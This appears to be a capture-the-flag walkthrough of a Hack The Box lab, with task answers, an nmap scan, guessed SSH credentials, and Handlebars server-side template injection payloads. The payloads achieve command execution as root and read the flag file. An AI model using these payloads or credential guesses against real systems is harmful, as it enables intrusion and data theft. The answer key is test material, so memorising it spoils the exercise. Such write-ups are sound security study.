## 1. Questions
- Task 1
	- What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high.
		- `22,80`
- Task 2
	- What software is running the service listening on the http/web port identified in the first question?
		- `Node.js`
- Task 3
	- What is the name of the Web Framework according to Wappalyzer?
		- `Express`
- Task 4
	- What is the name of the vulnerability we test for by submitting {{7\*7}}?
		- `Server Side Template Injection`
- Task 5
	- What is the templating engine being used within Node.JS?
		- `Handlebars`
- Task 6
	- What is the name of the BurpSuite tab used to encode text?
		- `Decoder`
- Task 7
	- In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use?
		- `URL`
- Task 8
	- When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error?
		- `require`
- Task 9
	- What variable is the name of the top-level scope in Node.JS?
		- `global`
- Task 10
	- By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?
		- `root`
- Submit Flag
	- Submit root flag
## 2. Tools
- Linux
- CLI
- nmap
- ssh
- curl
- echo
- tee
- BurpSuite
## 3. Process
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -T4 10.129.30.246
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<snip>
```
### Research common login credentials
- Usernames
	- https://portswigger.net/web-security/authentication/auth-lab-usernames
	- https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials#:~:text=Try%20the%20following%20usernames%20%2D%20%E2%80%9Cadmin,%E2%80%9Ctesting%E2%80%9D%20and%20similar%20names.
- Passwords
	- https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
	- https://outpost24.com/blog/it-admins-weak-password-use/
### Test ssh connection
- Useful source
	- https://hackviser.com/tactics/pentesting/services/ssh
- Test credentials
	- Usernames
		- `admin`
		- `administrator`
		- `root`
		- `system`
		- `guest`
		- `test`
	- Passwords
		- `qwerty`
		- `password`
		- `admin`
		- `root`
		- `admin@123`
- Unsuccessful connection with example credentials
### Webserver Response Testing
- Useful resource
	- https://devhints.io/curl
#### curl
```bash
curl -i http://10.129.30.246
```
- Key Response Elements
```html
<p class="result">
    </p>
```
#### Browser
![](Screenshot%202025-09-16%20at%2011.14.59.png)
### Form Response Testing
#### Browser
- Test Data: `test@test.com`
![](Screenshot%202025-09-16%20at%2011.16.56.png)
### Research webpage injection vulnerability
- https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
- https://www.vaadata.com/blog/server-side-template-injection-vulnerability-what-it-is-how-to-prevent-it/
- https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68
### Testing SSTI Vulnerability
- Useful resources
	- https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68
	- https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars-nodejs
#### Browser
- Test Data: `**${{<%[%'"}}%\.**`
![](Screenshot%202025-09-16%20at%2014.15.31.png)
#### Curl
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://10.129.30.246'
```
- Response - Key Message
```bash
"Error: You must pass a string or Handlebars AST to Handlebars.compile. You passed undefined"
```
### Handlebars Payload Testing
- Useful resource
	- https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars-nodejs
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
- Using BurpSuite, URL encode
- Pass POST request into BurpSuite Repeater
- Replace POST parameter `email` value with encoded value.
- Key Response Message
	- `"ReferenceError: require is not defined"`
### Test alternate ways to use the require function
- Useful resource
	- https://nodejs.org/api/process.html#processmainmodule
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
- Using BurpSuite, URL encode
- Pass POST request into BurpSuite Repeater
- Replace POST parameter `email` value with encoded value.
- Key Response Elements
```html
<p class="result">
  We will contact you at:       e
  2
  [object Object]
  function Function() { [native code] }
  2
  [object Object]
  [object Object]

</p>
```
### Test alternate ways to return object value
- Useful resources
	- https://nodejs.org/api/child_process.html
	- https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback
	- https://nodejs.org/api/child_process.html#child_processexecsynccommand-options
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
- Using BurpSuite, URL encode
- Pass POST request into BurpSuite Repeater
- Replace POST parameter `email` value with encoded value.
- Key Response Element
```html
<p class="result">
	We will contact you at:       e
	2
	[object Object]
	function Function() { [native code] }
	2
	[object Object]
	root


</p>
```
###  Explore files and directories
- Flag found in `/root` directory
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
- Using BurpSuite, URL encode
- Pass POST request into BurpSuite Repeater
- Replace POST parameter `email` value with encoded value.
- Key Response Element
```html
<p class="result">
	We will contact you at:       e
	2
	[object Object]
	function Function() { [native code] }
	2
	[object Object]
	Backend
	flag.txt
	snap


</p>
```
### Retrieve the flag
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
